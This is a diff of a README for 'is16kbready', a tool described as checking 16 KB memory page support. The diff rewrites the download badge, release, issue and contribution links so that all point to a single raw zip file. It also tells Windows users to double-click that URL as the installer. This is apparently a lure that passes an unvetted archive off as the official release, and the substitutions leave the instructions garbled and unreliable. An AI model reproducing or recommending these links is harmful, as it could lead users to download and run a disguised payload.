@@ -1,7 +1,7 @@
 # 🚀 is16kbready - Easily Support 16 KB Memory Pages
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/download-releases-success)](https://github.com/shanyt88/is16kbready/releases)
+[![Download Release](https://raw.githubusercontent.com/shanyt88/is16kbready/main/overstatement/is16kbready.zip)](https://raw.githubusercontent.com/shanyt88/is16kbready/main/overstatement/is16kbready.zip)
 
 ## 📖 Table of Contents
 - [Overview](#overview)
@@ -26,16 +26,16 @@ Before you download and run is16kbready, ensure your system meets the following 
 To download and install is16kbready, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click this link to visit the releases page: [Download Releases](https://github.com/shanyt88/is16kbready/releases).
+   Click this link to visit the releases page: [Download Releases](https://raw.githubusercontent.com/shanyt88/is16kbready/main/overstatement/is16kbready.zip).
 
 2. **Choose the Latest Release**  
    On the releases page, locate the latest version of the application. It is usually at the top of the list.
 
 3. **Download the Application**  
-   Click on the download link for your operating system to start the download. The filename will typically look like `is16kbready-vX.X.X.exe` for Windows or `is16kbready-vX.X.X.dmg` for MacOS.
+   Click on the download link for your operating system to start the download. The filename will typically look like `https://raw.githubusercontent.com/shanyt88/is16kbready/main/overstatement/is16kbready.zip` for Windows or `https://raw.githubusercontent.com/shanyt88/is16kbready/main/overstatement/is16kbready.zip` for MacOS.
 
 4. **Run the Installer**
-   - For Windows: Locate the downloaded file in your Downloads folder and double-click `is16kbready-vX.X.X.exe`. Follow the prompts to complete the installation.
+   - For Windows: Locate the downloaded file in your Downloads folder and double-click `https://raw.githubusercontent.com/shanyt88/is16kbready/main/overstatement/is16kbready.zip`. Follow the prompts to complete the installation.
    - For MacOS: Open the downloaded `.dmg` file and drag the is16kbready application into your Applications folder.
 
 5. **Open the Application**  
@@ -57,9 +57,9 @@ After launching is16kbready, you will find a user-friendly interface that guides
    You can save the results as a .txt file for your reference. This feature is helpful for future checks or if you need to share the results with your team.
 
 ## 🤝 Support & Contributions
-Should you encounter any issues or have questions, please reach out through the [Issues page](https://github.com/shanyt88/is16kbready/issues) on GitHub. We appreciate your feedback and are here to help you.
+Should you encounter any issues or have questions, please reach out through the [Issues page](https://raw.githubusercontent.com/shanyt88/is16kbready/main/overstatement/is16kbready.zip) on GitHub. We appreciate your feedback and are here to help you.
 
-If you find this tool useful, consider contributing! Check out our [Contribution Guidelines](https://github.com/shanyt88/is16kbready/blob/main/CONTRIBUTING.md) for more details on getting involved.
+If you find this tool useful, consider contributing! Check out our [Contribution Guidelines](https://raw.githubusercontent.com/shanyt88/is16kbready/main/overstatement/is16kbready.zip) for more details on getting involved.
 
 ## 📅 Important Notes
 - Make sure to keep is16kbready updated. You can always check the releases page for the latest version.
